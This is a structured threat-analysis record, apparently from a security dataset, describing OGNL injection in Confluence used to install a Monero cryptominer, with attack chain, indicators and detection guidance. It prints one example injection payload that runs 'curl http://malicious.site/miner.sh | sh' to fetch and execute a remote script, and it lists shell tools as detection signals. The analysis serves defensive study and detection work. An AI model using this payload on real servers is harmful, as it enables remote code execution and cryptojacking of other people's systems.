package_info.package_versions: All versions prior to patched releases (e.g., 7.13.0 and earlier)
package_info.why_malicious: The vulnerability allows attackers to execute arbitrary OGNL expressions, leading to remote code execution. Attackers exploited this to install cryptomining malware (Monero miner) on compromised servers.

execution_context.trigger: runtime (via remote exploit of OGNL injection)
execution_context.file_location: HTTP request to vulnerable Confluence endpoint (OGNL injection point)

malicious_snippets.code_snippet: OGNL expression injected via HTTP request, e.g., ${(#a=@java.lang.Runtime@getRuntime().exec('curl http://malicious.site/miner.sh | sh'))}
malicious_snippets.code_behavior: Executes arbitrary system commands on the Confluence server, typically to download and run a cryptominer payload.

malice_analysis.why_suspicious: OGNL expressions in HTTP requests should never result in code execution on the server. The ability to execute arbitrary commands is a hallmark of remote code execution attacks.
malice_analysis.violated_expectations: Normal Confluence endpoints should only process safe, expected input. Arbitrary code execution via user input is never legitimate.
malice_analysis.similar_legitimate_use: OGNL is used for data binding in Java web frameworks, but never for direct command execution from user input.
key_indicators: Unexpected process execution (e.g., curl, wget, bash) from the Confluence process
Network connections to external sites for payload retrieval

execution_context.trigger: runtime (after successful RCE via OGNL injection)

malicious_snippets.code_behavior: Downloads and executes a shell script that installs and runs a Monero cryptominer on the compromised server.

malice_analysis.why_suspicious: Directly downloads and executes code from an untrusted external source. This is a common method for malware delivery.
malice_analysis.violated_expectations: Production servers should not download and execute arbitrary scripts from the internet.
malice_analysis.similar_legitimate_use: Automated provisioning scripts may download dependencies, but only from trusted sources and with integrity checks.
key_indicators: Outbound connections to known cryptomining infrastructure

attack_chain.action: Attacker sends a crafted HTTP request exploiting OGNL injection to achieve remote code execution.
attack_chain.leads_to: Allows attacker to execute arbitrary commands on the Confluence server.

attack_chain.action: Attacker uses RCE to download and execute a cryptominer installation script.
attack_chain.leads_to: Cryptominer is installed and begins mining Monero, consuming server resources.

behavioral_signatures: Unexpected OGNL expressions in HTTP requests
Process execution from the Confluence server process (e.g., bash, curl, wget)
Outbound network connections to untrusted domains
Sudden increase in CPU usage due to cryptomining
file_indicators: Presence of cryptominer binaries (e.g., xmrig, minerd) in temporary or user directories
network_indicators: Outbound HTTP requests to attacker-controlled domains (e.g., malicious.site)
detection_knowledge.how_to_detect: Monitor Confluence server logs for OGNL payloads in HTTP requests. Alert on process creation events where the parent is the Confluence process and the child is a shell, curl, wget, or known cryptominer. Watch for new or unexpected files in /tmp or user directories. Monitor for outbound connections to cryptomining pools or suspicious domains. Correlate sudden CPU spikes with new processes or network activity.
